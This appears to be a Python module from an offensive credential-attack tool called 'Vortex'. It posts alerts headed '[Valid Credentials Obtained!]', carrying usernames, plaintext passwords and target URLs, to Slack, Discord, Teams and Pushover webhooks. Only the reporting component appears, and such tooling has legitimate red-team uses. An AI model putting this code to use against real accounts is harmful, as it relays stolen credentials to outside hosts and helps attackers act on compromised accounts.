import requests
import json
from datetime import datetime
from discordwebhook import Discord


class Notifier:

    def __init__(self, **kwargs):
        self.slack_webhook = kwargs.get('slack_webhook', None)
        self.discord_webhook = kwargs.get('discord_webhook', None)
        self.teams_webhook = kwargs.get('teams_webhook', None)
        self.pushover_token = kwargs.get('pushover_token', None)
        self.pushover_user = kwargs.get('pushover_user', None)
        self.operator = kwargs.get('operator_id', None)
        self.exclude_password = kwargs.get('exclude_password', False)
        self.to_notify = []
        if self.slack_webhook is not None:
            self.to_notify.append('slack')
        if self.discord_webhook is not None:
            self.to_notify.append('discord')
        if self.teams_webhook is not None:
            self.to_notify.append('teams')
        if self.pushover_token is not None and self.pushover_user is not None:
            self.to_notify.append('pushover')

    # Function for posting username/password to Teams
    def notify_success(self, username, password, group="", url=""):
        kwargs = {"username": username, "password": password, "group": group, "url": url}
        self.__notify(**kwargs)

    def notify_update(self, message):
        kwargs = {"message": message}
        self.__notify(**kwargs)

    def __notify(self, **kwargs):
        text = self.__generate_message(**kwargs)

        if 'slack' in self.to_notify:
            message = {
                "text": text
            }
            _ = requests.post(
                self.slack_webhook,
                json=json.dumps(message)
            )
        if 'discord' in self.to_notify:
            _discord = Discord(url=self.discord_webhook)
            _ = _discord.post(content=text)

        if 'teams' in self.to_notify:
            _ = requests.post(
                url=self.teams_webhook,
                headers={"Content-Type": "application/json"},
                json={
                    "summary": "[Valid Credentials Obtained!]",
                    "sections": [{
                        "activityTitle": "Vortex Bot",
                        "activitySubtitle": f"{text}"
                    }],
                },
            )
        if 'pushover' in self.to_notify:
            _ = requests.post(
                url="https://api.pushover.net/1/messages.json",
                data={
                    "token": self.pushover_token,
                    "user": self.pushover_user,
                    "message": text,
                    "title": "[Vortex Notifier]",
                    "priority": "1",
                },
            )

    def __generate_message(self, username=None, password=None, message="Status: Alive", group="", url=""):
        op_insert = ""
        now = datetime.now()
        date = now.strftime("%d-%m-%Y")
        time = now.strftime("%H:%M:%S")
        if self.operator is not None:
            op_insert = f"Operator: {self.operator}\n"

        if username and password:
            pwd_insert = f"Pass: {password}\n"
            if self.exclude_password:
                pwd_insert = ""

            text = ("```[Valid Credentials Obtained!]\n"
                    f"{op_insert}"
                    f"User: {username}\n"
                    f"{pwd_insert}"
                    f"Group: {group}"
                    f"URL: {url}"
                    f"Date: {date}\n"
                    f"Time: {time}```")
        else:
            text = (
                "[Log Entry]\n"
                f"{op_insert}"
                f"Message: {message}\n"
                f"Date: {date}\n"
                f"Time: {time}"
            )
        return text
